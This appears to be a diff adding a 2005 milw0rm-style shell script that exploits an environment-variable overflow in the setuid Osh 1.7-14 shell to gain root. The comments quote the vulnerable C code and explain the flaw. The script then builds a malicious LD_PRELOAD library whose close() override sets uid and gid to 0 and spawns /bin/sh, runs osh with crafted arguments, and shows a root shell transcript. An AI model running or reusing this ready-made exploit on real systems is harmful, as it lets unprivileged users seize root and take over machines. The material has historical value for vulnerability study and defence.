@@ -1,0 +1,107 @@
+#!/bin/sh
+#
+# OSH 1.7-14 Exploit
+#
+# EDUCATIONAL purposes only.... :-)
+#
+# by Charles Stevenson (core) <core@bokeoa.com>
+#
+# Description:
+# The Operator Shell (Osh) is a setuid root, security enhanced, restricted
+# shell. It allows the administrator to carefully limit the access of special
+# commands and files to the users whose duties require their use, while
+# at the same time automatically maintaining audit records. The configuration
+# file for Osh contains an administrator defined access profile for each
+# authorized user or group.
+#
+# Problem discovered and described by Solar Eclipse:
+#  
+#  main.c:439
+#  
+#      if (gettoken(env, MAXENV)!=TWORD) {
+#        fprintf(stderr,"Illegal or too long environment variable\n");
+#        break;
+#      }
+#      if ((env2=getenv(env))==NULL) {
+#        char temp[255];
+#        char *temp2;
+#  
+#        strcpy(temp,env);
+#        if ((temp2=(char *)strrchr(temp,'/'))!=NULL) {
+#          if (temp2!=temp)
+#            *temp2='\0';
+#          else
+#            *(temp2+1)='\0';
+#          if ((env2=getenv(temp))!=NULL) {
+#            strcat(env2,"/");
+#            strcat(env2,temp2+1);
+#          }
+#        }
+#      }
+#  
+#  exploit:
+#  
+#      This code is used to handle substitutions of environmental
+#      variables. If the first call to getenv() fails, we might have a case
+#      like $VAR/filename, so we find the last '/' character and replace
+#      it with '\0'. Then we call getenv() on the shortened variable and
+#      append "/filename" to it. The problem is that the return value of
+#      getenv() is a NULL terminated string on the stack and by appending
+#      to it we will overwriting the data after the string.
+#  
+#      This bug allows us to overwrite one of the environmental variables
+#      passed to the child process. If we set the environmental variable
+#      $VAR to the string "a" before executing osh, and then pass
+#      "$VAR/LD_PRELOAD=evil.so" as a command line parameter, the above
+#      code will overwrite the value of some environmental variable located
+#      after $VAR with LD_PRELOAD=evil.so. Then osh will execute an
+#      external non-suid program and the code in evil.so will be executed.
+#  
+#      I have not tested this, but it looks like a really cool bug.
+#
+# Risk: Medium since user would have to be in the operator group which
+#       the admin would have to grant explicitly and I assume would be
+#       a trustworthy individual ;-)
+#
+#       Then again the last two have been classified as "urgency=high"
+#       according to Debian policy.  Truly sorry to cause Oohara Yuuma
+#       so much work.  You really should orphan this package ;)
+#
+# Solution:
+# apt-get --purge remove osh
+#
+# greetz to solar eclipse, nemo, andrewg, arcanum, mercy, amnesia, 
+# banned-it, capsyl, sloth, ben, KF, akt0r, MRX, salvia, thn
+#
+# irc.pulltheplug.org (#social)
+# 0dd: much <3 & respect
+#
+# Obligatory screenshot:
+#   core@charity:~/hacking/sploits$ dpkg -l osh|grep ^ii
+#   ii  osh            1.7-14         Operator's Shell
+#   core@charity:~/hacking/sploits$ ./x_osh3.sh 
+#   telnet: could not resolve /home/core/LD_PRELOAD=ownall.so/telnet: Name or service not known
+#   sh-3.00# id
+#   uid=0(root) gid=0(root) groups=0(root)
+
+
+cd /tmp; cat >ownall.c <<EOF
+/* ownall.c by Charles Stevenson (core) <core@bokeoa.com>
+ * greetz Solar Eclipse, 0dd, irc.pulltheplug.org (#social) */
+#include <stdlib.h>
+#include <unistd.h>
+int close(int fd) {
+  gid_t groupsex = 0; /* osh isn't gettin' any tonight */
+  setuid(0); /* Not really needed but make uid root */
+  setgid(0); /* Set gid root too! */
+  setgroups((size_t)1,&groupsex); /* This makes my pastes cooler looking */
+  clearenv(); /* LD_PRELOAD was causing headaches ;) */
+  execl("/bin/sh","/bin/sh",NULL);
+  return 0;
+}
+EOF
+gcc -shared -o ownall.so ownall.c
+osh telnet -l '$USER/LD_LIBRARY_PATH=.' '$HOME/LD_PRELOAD=ownall.so'
+rm -f ownall*
+
+# milw0rm.com [2005-11-09]
